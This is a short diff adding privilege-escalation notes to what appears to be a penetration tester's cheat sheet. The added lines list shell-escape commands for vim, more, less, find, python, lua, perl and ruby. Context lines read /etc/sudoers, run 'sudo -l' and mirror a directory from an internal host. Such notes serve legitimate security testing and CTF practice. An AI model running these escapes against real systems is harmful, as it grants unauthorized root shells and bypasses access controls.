@@ -69,6 +69,24 @@ wget -r --no-parent http://192.168.2.101/~root/
 cat /etc/sudoers 
 sudo -l
 
+VIM:
+	!/bin/bash
+	:shell
+more:
+	!bash
+less:
+	v and :shell
+find:
+	find . -exec bash -i \;
+python:
+	>>import os
+	>> os.system(‘/bin/bash’)
+LUA:
+	> os.execute("/bin/bash")
+PERL:
+	exec “/bin/bash”;
+RUBY:
+	exec “/bin/bash”
 
 
 
